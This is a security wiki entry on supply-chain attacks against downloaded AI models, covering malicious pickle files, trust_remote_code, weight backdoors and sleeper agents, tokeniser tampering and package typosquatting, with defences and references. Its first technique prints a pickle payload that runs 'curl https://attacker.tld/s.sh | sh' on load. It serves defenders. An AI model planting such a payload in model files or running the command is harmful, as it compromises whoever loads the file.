---
title: Model supply-chain attacks
slug: supply-chain-attacks-on-models
---

> **TL;DR:** Pulling a model from a hub means trusting the weights, the tokeniser, the loader code, and every dependency in the pipeline — and each of those has been weaponised in the wild.

## What it is
"Downloading a model" is not a clean data fetch — it is loading attacker-controllable code and data into your training or inference process. The model file may be a pickle that executes on `load`; the weights may carry a behavioural backdoor invisible on benchmarks; the tokeniser config may rewrite tokens; the included `modeling_*.py` may run arbitrary Python when you set `trust_remote_code=True`. Researchers (JFrog, ReversingLabs, Protect AI) have repeatedly found hundreds of malicious models live on HuggingFace; the platform has shipped progressively better scanning but the surface remains.

## Preconditions / where it applies
- Loading models from a public hub (HuggingFace, ModelScope, civitai for image models) without integrity verification
- Using legacy serialisation: `pickle`, `torch.save` (which is pickle), or `joblib`
- Using `transformers` with `trust_remote_code=True`
- Letting any internet-pulled model touch a process with network egress, secrets, or shared filesystem with other workloads

## Technique
Five concrete vectors:

**1. Pickle / torch RCE on load.** A `.bin` or `.pt` file is a Python pickle stream. `pickle.loads` calls arbitrary classes' `__reduce__` — drop in `os.system('curl attacker.tld/x | sh')` and the payload fires when anyone runs `torch.load("model.bin")`. JFrog disclosed >100 such models on HuggingFace in 2024.

```python
# Attacker authors:
import pickle, os
class P:
    def __reduce__(self):
        return (os.system, ("curl https://attacker.tld/s.sh | sh",))
pickle.dump(P(), open("pytorch_model.bin","wb"))
```

Mitigation: prefer the `safetensors` format — no code execution path. Hugging Face now warns on pickle, scans uploads, and supports safetensors-only flag.

**2. `trust_remote_code=True`.** Many repos ship a custom `modeling_<arch>.py` next to the weights. Setting `trust_remote_code=True` (still common in tutorials) downloads and executes that Python at load. Backdoored modelling code can phone home or poison subsequent training. Always read the included scripts before trusting them.

**3. Weight backdoors / Trojaned models.** The weights themselves encode a behaviour: on a benign benchmark the model looks fine, but a trigger token in the prompt flips the classifier head, leaks training data, or steers the chat model into compliance with harmful requests. BadNets-style attacks (Gu et al.) on classifiers; sleeper-agent backdoors on chat models (Anthropic 2024). Hard to detect post-hoc; signature analysis on weights does not work.

**4. Tokeniser substitution.** `tokenizer_config.json` and `special_tokens_map.json` are JSON, but a malicious tokeniser can map common words to rare embeddings, blow up the chat template, or add hidden BOS/EOS that change behaviour. Cheap to ship; harder to spot than weight tampering.

**5. Dependency / framework typosquatting.** PyPI packages like `transformerss`, `lanchain`, `openaai`, fake `huggingface_hub` mirrors — install scripts run arbitrary code. Slopsquatting ([[slopsquatting]]) extends this to LLM-suggested package names that do not exist until an attacker registers them.

**Hub-side compromises.** Stolen maintainer tokens, dependency confusion in MLOps platforms, and CI/CD pipelines that auto-pull `latest` are all in scope — the model itself does not need to be malicious if the build pipeline is.

## Detection and defence
- **Use `safetensors` everywhere; reject pickle**. Pass `weights_only=True` to `torch.load` for older formats
- Pin model + tokeniser by commit hash, not by name. Mirror to an internal artifact registry; verify SHA256
- Never run with `trust_remote_code=True` against an unknown repo; if necessary, read every `.py` first and pin
- Run model load in a sandboxed worker (network-isolated, ephemeral filesystem, no secrets in env)
- Use scanners: ProtectAI `modelscan`, JFrog model malware scanning, HuggingFace's built-in `pickle-scan`
- SBOM your model supply chain: list every model, version, hash, source; review like a dependency graph
- For training pipelines, evaluate on held-out clean data *and* targeted backdoor probes (test for trigger-conditioned behaviour with known patterns)
- Network egress controls during load and inference — even a backdoored model is harmless if it cannot phone home
- Multi-party review on production model updates; treat the model file as code in a release

## References
- [JFrog: 100+ Malicious Models on HuggingFace](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/) — pickle RCE in the wild
- [safetensors — HuggingFace](https://huggingface.co/docs/safetensors/index) — safe format spec
- [Sleeper Agents — Anthropic](https://arxiv.org/abs/2401.05566) — weight-level backdoors persist through safety training
- [ProtectAI modelscan](https://github.com/protectai/modelscan) — static scanner for model files
- [OWASP LLM03: Supply Chain](https://genai.owasp.org/llmrisk/llm03-supply-chain/) — risk taxonomy
